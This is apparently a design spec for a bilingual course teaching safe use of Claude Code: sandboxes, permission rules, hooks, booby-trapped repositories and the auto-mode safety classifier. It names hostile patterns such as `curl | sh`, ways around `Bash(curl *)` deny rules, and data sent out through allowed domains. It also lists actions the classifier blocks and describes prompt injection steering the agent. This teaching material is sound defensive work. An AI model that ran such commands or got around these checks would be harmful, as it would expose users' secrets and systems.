- **Subagents** run in their own context and send back a summary. You can limit their tools (`tools`, `disallowedTools`). They inherit Bypass permissions, Accept edits, and auto mode from the main session. Their reports are scanned for instruction-like text, but that isn't a judgment of intent.
- Practice: Review before install, Fix the settings (a skill with a broad `allowed-tools`, a plugin hook that sends data out), Pick the setup (install scope), Approve or deny.
- Docs: `skills`, `plugins/install`, `plugins/security`, `sub-agents`, `features-overview`.

### 9. Installing code safely (wave 2)

Lookalike and made-up packages, install scripts, `curl | sh`, `npx -y`. **Booby-trapped projects**, updated with the docs' "What runs before you trust a folder" table:
- a project's `permissions.allow` rules wait for the trust dialog;
- its **hooks run if you trusted only a parent folder**, and in `claude -p` runs;
- project skills' `allowed-tools` are never gated by trust;
- `.mcp.json` servers ask first in interactive sessions, but connect without asking in `-p` runs;
- a project can't set `defaultMode` to auto or bypass, and can't turn on Chrome.

Safe habits: open unfamiliar repos in a project folder (not home) and read the trust dialog; before `claude -p` in someone else's repo, use `--setting-sources user` or `--bare`; prefer a VM or cloud session for untrusted code. Practice: Real or fake package, Fix the settings (`.claude/settings.json` hooks, `.mcp.json`, a skill), Approve or deny. Docs: `permissions#what-runs-before-you-trust-a-folder`, `security`, `sandbox-environments`, `plugins/security`.

### 10. Sandboxes (wave 2)

What a sandbox is. **The built-in sandbox:** off by default. **Try it:** `/sandbox`, auto-allow vs. regular permissions, and checking it works (`touch ~/sandbox-probe` should fail). By default, writes are limited to the working folder and temp, the network goes through a proxy with an allowlist that starts empty, and **reads still include most of your machine, `~/.ssh` and `~/.aws` included**. There's no built-in credential deny list, so add `sandbox.credentials` entries yourself. **What runs outside it:** Claude's file tools, web fetch, MCP servers, hooks, plugin processes, commands you type with `!`. **The escape hatch:** Claude may retry a failed command outside the sandbox. Decline unless you know why, or turn retries off with strict sandbox mode (`allowUnsandboxedCommands: false`). **Network restrictions** from revision 1, now sourced: broad allowed domains like `github.com` can carry data out (domain fronting), Unix sockets like the Docker socket give away the host, and names that resolve to `localhost` or the cloud metadata address are refused. **Whole-process isolation:** the sandbox runtime (`srt claude`), dev containers with a firewall, VMs, Docker Sandboxes, and cloud sessions (Anthropic-managed VM, GitHub token kept outside the VM, network limited by default). Native Windows has no built-in sandbox; use WSL2. Practice: Inside or outside?, Will it get out? / Trim the list, Pick the setup. Docs: `sandboxing`, `sandbox-environments`, `devcontainer`, `claude-code-on-the-web`, `security#cloud-execution-security`.

### 11. Locking it down (wave 1)

- **Settings files and who they affect:** user `~/.claude/settings.json` (you, every project), shared project `.claude/settings.json` (everyone, via git), project local `.claude/settings.local.json` (you, this project; where "don't ask again" writes), and managed (your organization). **Which wins:** managed → `--settings` on the command line → project local → shared project → user. Lists like `permissions.allow` **merge** across files instead of replacing each other. **Try it:** `/status` → "Setting sources".
- **Rules:** `allow`, `ask`, `deny`. Evaluated **deny, then ask, then allow**. The first match wins, and specificity doesn't matter, so an allow can't carve an exception out of a deny. A deny anywhere beats an allow anywhere. Deny and ask rules hold in every mode, Bypass permissions included.
- **Rule syntax:** `Tool` or `Tool(specifier)`: `Bash(npm run test *)`, `Read(./.env)`, `Edit(…)`, `WebFetch(domain:example.com)`, `mcp__server__tool`. Compound commands are split, so `Bash(safe-cmd *)` doesn't approve `safe-cmd && other-cmd`.
- **What a Bash rule doesn't match:** `Bash(curl *)` doesn't stop `/usr/bin/curl …` or `sh -c 'curl …'`. Rules are guard rails for what Claude usually writes, not a wall. For a wall, use the sandbox (unit 10) or a hook. Argument-matching rules like `Bash(curl http://github.com/ *)` are fragile.
- **Try it: protect your secrets:** add `"deny": ["Read(./.env)", "Read(./.env.*)"]` to your user settings, then check it in `/permissions`.
- **Hooks:** your own commands that run at set moments (`PreToolUse` before a tool runs). A hook that exits with code 2 blocks the action and tells Claude why. **A hook's deny holds in every mode, Bypass included.** Walk through the docs' "block edits to protected files" example (as a reading exercise, not something learners must type). Hooks run with your full permissions, outside the sandbox, so treat a hook someone else wrote like any program. `/hooks` lists what's set.
- **A starter safe setup** that combines everything: Manual mode while learning, deny rules for secrets, `ask` rules for `git push` and deploys, sandbox on, separate browser profile.
- Practice: Build the rule, Which file wins?, Fix the settings, Pick the setup, Approve or deny (including `ask`-rule prompts).
- Docs: `settings`, `permissions`, `hooks-guide`, `hooks`, `settings-reference`.

### 12. Auto mode, safely (wave 1, new)

- **What it is:** instead of asking you, Claude Code sends most actions to a **classifier** (a second model) that blocks anything that "escalates beyond your request, targets unrecognized infrastructure, or appears driven by hostile content Claude read." In terminal and VS Code it's where new sessions start (v2.1.283+). The docs' own warning: auto mode "reduces permission prompts but does not guarantee safety."
- **When to use it:** after you can read prompts yourself, for tasks where you trust the general direction. Not for sensitive one-off operations.
- **What the classifier sees:** your messages, Claude's tool calls, and CLAUDE.md, but **not tool results**. A malicious web page can't argue with the classifier directly, though it can still steer Claude. A separate server-side check also scans incoming tool results.
- **What skips the classifier:** reads and edits inside your working folder run without review (except protected files, which go to the classifier). `ask` rules always prompt you. `rm` of critical paths is handled separately. The first read outside your working folders asks you once, with options to keep allowing or to block from then on.
- **Blocked by default** (pick the ones learners meet): downloading and running code (`curl | bash`), sending sensitive data outside, force push, destroying files that existed before the session, `git reset --hard`, printing a live token, pushing secrets to a public repository, posting a link whose URL carries your data to a paste site, browser actions that send page content or cookies off-site.
- **Allowed by default** (the part people miss): local file work in your folder, installing dependencies your project lists, **reading `.env` and sending a credential to its matching API**, read-only web requests, pushing to any branch of your repo.
- **Broad allow rules are dropped while in auto mode** (`Bash(*)`, `Bash(python*)`, package-manager run commands) and come back when you leave it.
- **Boundaries you state in chat** ("don't push") make the classifier block matching actions, but they're re-read from the conversation each time, so **compaction can erase them**. For a guarantee, add an `ask` or `deny` rule.
- **Clearing a block:** your approval must name the action and the specific risky detail ("force-push to `feature-x`"). "You can force-push" isn't enough. An approval covers that one action.
- **When it gives up:** 3 blocks in a row or 20 in a session pauses auto mode and goes back to prompting. **Try it:** `/permissions` → **Recently denied**, where you can retry a blocked action with your own approval.
- **Subagents in auto mode:** the classifier checks the task before a subagent starts, each of its actions, and its report at the end.
- **Auto mode plus sandbox:** the classifier decides *whether* an action runs, and the sandbox limits *what it can reach* if it does. In auto mode with the sandbox on, Claude names the hosts a command needs and the classifier reviews them with the command. Because unit 10 is wave 2, this unit carries its own short sandbox explainer card that links ahead.
- Practice: Would auto mode stop this?, Pick the setup (when to use auto vs. Manual; which `ask` rules to add first), Approve or deny where "switch to auto mode" can be right.
- Docs: `permission-modes#eliminate-prompts-with-auto-mode`, `auto-mode-config`, `permissions`, `sandboxing#per-command-allowed-domains-in-auto-mode`. Also www.anthropic.com/engineering/claude-code-auto-mode and claude.com/blog/auto-mode.

### 13. Boss: Continue? Y/N (wave 2)

60 seconds, ~20 prompts drawn from all ready units, mostly harmless, mixed terminal and desktop, Manual mode. Recap lists what you allowed and denied, each with a one-line lesson and a "Learn more" link. Docs: links come from the items' own units.

## Content rules

**Bilingual.** All learner-facing text exists in English and Japanese. The switch is in the header and remembered. The default comes from the browser's language (my call). **English is the primary language** (owner's decision): content is written in English first, and Japanese is a full translation that should read naturally. No separate Japanese review step is planned. Commands, file paths, code, settings keys, and terminal output stay as they really appear and are never translated. UI labels quoted from Claude Code (mode names, prompt options, status-bar text) stay in English, since that's what the learner will see on screen, with a Japanese gloss on first use (my call). Claude's narration inside a simulation is translated, since Claude answers in the user's language (my call).

**Accuracy.**
- Every fact about Claude Code (prompts, modes, settings, tools, sandboxing, browser behavior) is checked against the official docs when written. Where the docs don't show exact wording, the installed `claude` CLI's own help output is the fallback.
- A **facts sheet** (`docs/claude-code-facts.md`) holds every claim the content relies on. Each entry has the fact, its source URL, the Claude Code version it describes (when the docs give one), and a "checked" date. Content cites facts by ID.
- Facts the docs don't settle are marked `UNVERIFIED`, and content must not state them as true. Known gaps today: the desktop app's starting permission mode, and the exact look of the desktop app's file-edit and shell prompts.
- Each unit stores `lastChecked`, which the site shows (my call from revision 1), and `linksChecked`, which it doesn't.
- The permission-prompt wording in simulations should match the real prompt closely.

**Content safety** (my calls):
- Fake secrets are obviously fake (e.g. `ntn_FAKE_8f3c…`).
- Attacker endpoints use reserved domains (`.example`, `example.com`, `.test`, `.invalid`). Well-known real services (a public paste site, npm, GitHub) may appear as the *destination* in a command, because recognizing them is the skill, but nothing is ever contacted.
- Injection text is illustrative and short, never a tuned jailbreak. The same goes for "Would auto mode stop this?": items teach what the classifier is for, never how to word things to get past it.
- No copy buttons on dangerous commands. Try it cards may have copy buttons on safe snippets.
- The site makes no network requests beyond loading itself and fonts. Doc links are plain links the learner clicks.

**Content lives in JSON**, typed and validated, as in cascade-learn. Components never hold lesson text. New for revision 2: doc links (slug + anchor, or full URL for allowed non-docs hosts), Try it cards with per-app steps, and fact IDs.

## Look and feel

Reuse cascade-learn's design tokens (`docs/design-tokens.md` there):
- Colors: warm ivory background, ink text, indigo primary, accent and feedback colors.
- Fonts: Bricolage Grotesque for display, DM Sans for body, JetBrains Mono for code. Add **Noto Sans JP** for Japanese.
- Components: chunky 3D buttons, ≥44px targets, a dark code/terminal panel.
- New components: Try it cards with a Terminal / Desktop app tab switch, a settings-file panel (JSON with line taps), the mode switcher demo, and a "Learn more" link style that clearly marks it as leaving the course.

Accessibility rules carry over: real buttons, `aria-pressed`, `aria-live` feedback, progressbars with values, 4.5:1 contrast, right/wrong never shown by color alone, and `prefers-reduced-motion` respected. Tabs follow the ARIA tabs pattern.

**Mockups:** `reference/design-canvas/` in this repo, also viewable at https://claude.ai/artifact/7zk5EQ53c6xfW3S8R4TpxE (private to the owner). They cover the course map (with working language switch), Learn: what Claude sees, Learn: terminal playground, Approve or deny, Find the hidden order, and Stop the chain. Use them as a spec for layout and behavior. They're written for a design-canvas runtime and won't run on their own, so don't port that runtime. The owner reviewed them and said they look good. Revision 2 adds no mockups. New screens follow the existing ones' look.

Where the mockups and this document disagree, this document wins:
- the unit order and count (13 units now);
- the static "0:42" timer on Approve or deny, which belongs to the boss unit;
- the per-item "Try again" button (missed items come back at the end of the run instead);
- the padlocks on ready units;
- the terminal-only look (simulations also come in a desktop-app version);
- prompts with only Yes / don't ask again / No (real prompts may also offer "switch to auto mode").

## Stack and build (decided)

- Same stack as cascade-learn: Vite + React + TypeScript, CSS Modules, Vitest, Playwright, GitHub Actions CI.
- A static site with no server.
- The builder may copy and adapt cascade-learn's quiz engine (session, hearts, re-queue, feedback sheet, progress storage) into this repo rather than sharing a package (my call).
- **Waves:** one plan. Wave 1 tasks (engine, all wave 1 practice types and demos, units 1–5, 11, 12, links, facts sheet) come first and leave a shippable site. Wave 2 tasks follow, one unit per task, each flipping that unit from "Coming soon" to ready.

## Left to the builder

- Exact JSON schema and file layout for content, translations, links, and Try it cards.
- Component structure, and how much cascade-learn code to copy versus rewrite.
- XP amounts and the decode-hint cost.
- Learn-card illustrations beyond the named demos.
- How "last checked" is shown.
- Exact card and item counts within the ranges.
- Which "Blocked by default" and "Allowed by default" rules unit 12 uses, as long as both lists are represented and the "reading `.env` and sending to its matching API" case appears.
- Hosting and deploy.
- A content-validation script. Useful checks: every item has both languages; every option has feedback; answers point at real options; doc links use allowed hosts and known slugs; every fact ID exists in the facts sheet; every ready unit has `lastChecked` and an "Official docs" list; Approve or deny options match the prompt type they claim.

## Changes to the repo rules

`CLAUDE.md` on `main` encodes revision 1. The revision 2 plan updates these lines along with the code:

- "Ready units have 3–5 Learn cards and 8–12 practice items" becomes **4–7 and 10–14**. Units 1–5 grow to fit (they're at 5 cards and 8–12 items now).
- "There are no copy buttons anywhere" becomes **no copy buttons except on safe snippets in Try it cards**. The e2e layout check that asserts no copy buttons needs the same exception.
- "at least one source URL" per ready unit becomes the **"Official docs" list** (doc slugs, 3–8 per unit), and `src/content/hosts.ts` gains the allowed doc-link hosts. Doc links are links the learner clicks, which is separate from the reserved-host rule for URLs inside simulations.
- `content/course.json` goes from 11 to 13 units: new unit keys for "Skills, plugins and subagents" and "Auto mode, safely", with sandboxes, lockdown, and the boss renumbered. Saved progress is keyed by unit key, not number, so renumbering doesn't lose anyone's progress. The builder confirms this in `src/storage/progress.ts`.
- The facts sheet keeps F1–F10 and adds new sections for the new topics. F4 already holds most of unit 12's facts.

## Calls I made (please check)

- The map stays in learning order with gaps during wave 1, instead of renumbering so the ready units come first.
- A new unit 8, "Skills, plugins and subagents", sits before "Installing code safely," which renumbers sandboxes to 10, lockdown to 11, and the boss to 13.
- Units grow to 4–7 Learn cards and 10–14 practice items.
- New "Try it" and optional "Under the hood" card kinds.
- Links store a slug, are built per language, and fall back to English with a label.
- Allowed link hosts beyond code.claude.com.
- "Yes, and switch to auto mode" is wrong in units 3–5 and can be right in 11–12.
- Claude Code's on-screen labels stay in English in Japanese content, with a gloss.
- "Bypass permissions" appears as a correct setup only for isolated containers or VMs, and only from unit 10 on.
- Browser upload items avoid the file names Claude in Chrome now refuses, so the lesson doesn't depend on a guard that only knows certain names.

## Open questions

None from the owner. Calls marked "my call" above are open to override.
